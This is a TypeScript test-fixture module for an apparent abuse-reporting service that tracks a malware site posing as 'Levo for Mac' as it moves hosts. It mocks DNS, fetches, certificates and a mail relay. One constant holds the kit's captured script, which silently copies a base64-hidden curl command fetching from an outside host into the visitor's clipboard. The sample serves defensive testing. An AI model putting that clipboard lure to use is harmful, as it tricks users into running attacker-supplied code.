import { eq } from "drizzle-orm";

import { SubmissionsEntity } from "@/lib/db/entities/submissions";
import { getDb } from "@/lib/db";
import { networkLookup, TRYLEVO_ROUTED_SNAPSHOT } from "@/lib/liveness/host_move.fixtures";
import type { HostMoveDependencies } from "@/lib/liveness/host_move";
import { livenessJobKey } from "@/lib/liveness/repository";
import { runLivenessCheck, scheduleLivenessChecks } from "@/lib/liveness/schedule";
import type { SiteCheckDependencies } from "@/lib/liveness/check";
import { seedTrylevoReports } from "@/lib/submissions/trylevo_reports.fixtures";
import type { sendAbuseEmailRoute } from "../mail/send";
import { validateAbuseReportRequest } from "../contracts";
import { AbuseRepository } from "../repository";
import type { resolveIpTarget } from "../resolver/ip";
import { contactRoute } from "../resolver/routes";
import { jobs, type Job } from "../schema";
import { sha256Hex } from "@/lib/util/hash";

/** Helpers of the host-move tests: the site as checks see it, the new host's resolution, a recording mail relay, and the reports. */
export const CASE = 384401854580134038n;
/** The kit's own script, as captured when the case was reported. */
export const DEMO_JS = Buffer.from("(()=>{const cmd=atob('Y3VybCAtc2ZMIC0tcmV0cnkgMyAtLXJldHJ5LWFsbC1lcnJvcnMgaHR0cHM6Ly9ob3N0c3luYy5wcm8vaGdwMDNtL0xOY2Y4S3BtNnFXcg==');navigator.clipboard.writeText(cmd)})();");
export const LETS_ENCRYPT = { names: ["trylevo.app"], notBefore: "2026-11-26T19:12:00.000Z", notAfter: "2027-02-24T19:11:59.000Z", issuer: "C=US, O=Let's Encrypt, CN=R13", fingerprint256: "4F:2A:91:0C:7E:55:13:B8:9D:60:AF:21:3C:D4:77:0E:58:9B:C2:16:E3:44:A0:7F:D5:28:61:B9:3E:0A:CC:12" };

/** The site as a check sees it: DNS, no registry hold, the page and the kit's script, at `now`. */
export function site(ips: string[], now: Date, options: { domain?: string; script?: number; server?: string; page?: number } = {}): SiteCheckDependencies & HostMoveDependencies {
	const domain = options.domain ?? "trylevo.app";
	return {
		dns: { resolve4: async () => ips, resolve6: async () => [], resolveCname: async () => [] },
		rdap: { rdapLocator: async () => undefined },
		assertPublicHost: async () => undefined,
		now: () => now,
		fetch: async (input) => {
			const url = input.toString();
			if (url === `https://${domain}/`) return new Response("<html><title>Levo for Mac</title><script src=\"js/demo.js\"></script></html>", { status: options.page ?? 200, headers: { "content-type": "text/html", server: options.server ?? "nginx/1.30.0" } });
			if (url === `https://${domain}/js/demo.js`) return (options.script ?? 200) === 200 ? new Response(DEMO_JS, { status: 200, headers: { "content-type": "application/javascript" } }) : new Response("Not Found", { status: options.script! });
			throw new Error(`Unexpected request to ${url}`);
		},
		network: networkLookup(),
		certificate: async (ip, name) => (ip.startsWith("85.137.52.") && name === domain ? LETS_ENCRYPT : undefined),
		proofFiles: async () => [{ path: "/js/demo.js", sha256: sha256Hex(DEMO_JS), kind: "script" }],
	};
}

/** The new address's abuse contact as the IP resolver finds it. */
export function resolving(email: string, asn: number, fallbacks: string[] = []) {
	const asked: string[] = [];
	const resolveIp = (async (target) => {
		asked.push(target.normalizedTarget);
		const snapshot = { target: target.normalizedTarget, bgpOrigin: { asns: [asn] } };
		const provenance = { email, source: "ip_rdap", ...(fallbacks.length ? { fallbackContacts: fallbacks.map((fallback) => ({ email: fallback, source: "asn_rdap" })) } : {}) };
		return { status: "resolved", resolverSnapshot: snapshot, routes: [contactRoute({ email, providerName: `Abuse contact for ${target.normalizedTarget}`, provenance, snapshot })] };
	}) as typeof resolveIpTarget;
	return { asked, resolveIp };
}

/** A mail relay that records each message as the real one does, so a second send under one key is seen. */
export function recordingSend(options: { refuse?: string } = {}) {
	const sent: Array<Parameters<typeof sendAbuseEmailRoute>[0]> = [];
	const send = (async (params) => {
		sent.push(params);
		if (options.refuse) {
			const rawArtifactId = await AbuseRepository.saveArtifact({ reportId: params.reportId, routeId: params.routeId, runId: params.runId, name: `refused-${sent.length}.eml`, kind: "outbound_mail_mime", mimeType: "message/rfc822", buffer: Buffer.from(params.body) });
			const messageId = await AbuseRepository.createOutboundMail({
				reportId: params.reportId, routeId: params.routeId, runId: params.runId, fromAddress: "support@phishing.support", toAddresses: [params.recipient], subject: params.subject, textBody: params.body,
				messageId: `<refused-${sent.length}@phishing.support>`, replyAddress: `abuse-r${sent.length}@reply.phishing.support`, correlationKey: params.correlationKey, rawArtifactId, attachmentArtifactIds: [],
			});
			await AbuseRepository.settleOutboundMail({ messageId, status: "failed", error: options.refuse });
			return { messageId, status: "failed", error: options.refuse };
		}
		const rawArtifactId = await AbuseRepository.saveArtifact({ reportId: params.reportId, routeId: params.routeId, runId: params.runId, name: `outbound-${sent.length}.eml`, kind: "outbound_mail_mime", mimeType: "message/rfc822", buffer: Buffer.from(params.body) });
		const messageId = await AbuseRepository.createOutboundMail({
			reportId: params.reportId, routeId: params.routeId, runId: params.runId, fromAddress: "support@phishing.support", toAddresses: [params.recipient], subject: params.subject, textBody: params.body,
			messageId: `<move-${sent.length}@phishing.support>`, replyAddress: `abuse-${sent.length}@reply.phishing.support`, correlationKey: params.correlationKey, rawArtifactId, attachmentArtifactIds: [],
		});
		await AbuseRepository.settleOutboundMail({ messageId, status: "sent" });
		return { messageId, status: "sent", rfcMessageId: `<move-${sent.length}@phishing.support>` };
	}) as typeof sendAbuseEmailRoute;
	return { sent, send };
}

export async function jobsOfType(type: Job["jobType"]): Promise<Job[]> {
	return (await getDb()).select().from(jobs).where(eq(jobs.jobType, type)).all().sort((a, b) => a.nextAttemptAt.getTime() - b.nextAttemptAt.getTime());
}

/** Run the target's pending check as the worker does: the job completes once it queued its successor. */
export async function check(targetId: bigint, dependencies: SiteCheckDependencies & HostMoveDependencies): Promise<void> {
	const [job] = (await jobsOfType("check_site_liveness")).filter((candidate) => candidate.status === "queued" && candidate.dedupeKey === livenessJobKey(targetId));
	await runLivenessCheck({ jobId: job!.id, targetId, dependencies });
	(await getDb()).update(jobs).set({ status: "completed" }).where(eq(jobs.id, job!.id)).run();
}

/** When the target's next check is due. */
export async function nextCheckAt(targetId: bigint): Promise<Date[]> {
	return (await jobsOfType("check_site_liveness")).filter((candidate) => candidate.status === "queued" && candidate.dedupeKey === livenessJobKey(targetId)).map((candidate) => candidate.nextAttemptAt);
}

export async function events(reportId: bigint, type: string) {
	return (await AbuseRepository.listEvents(reportId)).filter((event) => event.eventType === type);
}

/** Case 384401854580134038 as it stood when trylevo.app left Cloudflare: reported behind Cloudflare, which restricted it and named Sollutium. */
export async function trylevo() {
	await SubmissionsEntity.create({ id: CASE, kind: "website", data: { kind: "website", website: { url: "https://trylevo.app/" } }, dedupeKey: "website-trylevo.app", status: "reported" });
	const { site: owner } = await seedTrylevoReports(CASE);
	await AbuseRepository.setTargetResolution({ targetId: owner.targetId, status: "resolved", resolverSnapshot: TRYLEVO_ROUTED_SNAPSHOT });
	await scheduleLivenessChecks(owner.targetId);
	return owner;
}

export const routeOf = async (reportId: bigint, key: string) => (await AbuseRepository.listRoutes(reportId)).find((route) => route.providerRegistryKey === key)!;

/** A site reported on a host of its own (not behind a CDN), in production's resolver snapshot shape. */
export async function reportedAt(ip: string, asn: number, holder: string) {
	const domain = "levo-mac.com";
	const request = await validateAbuseReportRequest({ targets: [domain], observedUrls: [{ target: domain, urls: [`https://${domain}/`] }], allegationCategory: "malware", description: `Malware distribution at https://${domain}/.` });
	const { reportId } = await AbuseRepository.createReport({ request, reporter: {} });
	const [target] = await AbuseRepository.listTargets(reportId);
	(await getDb()).delete(jobs).where(eq(jobs.reportId, reportId)).run();
	await AbuseRepository.setTargetResolution({ targetId: target!.id, status: "resolved", resolverSnapshot: { target: domain, infrastructure: { ipResolutions: [{ ip, status: "resolved", resolverSnapshot: { bgpOrigin: { asns: [asn] }, asnRdap: [{ asn, organization: { organization: holder } }] } }] } } });
	await scheduleLivenessChecks(target!.id);
	return { reportId, targetId: target!.id, domain };
}

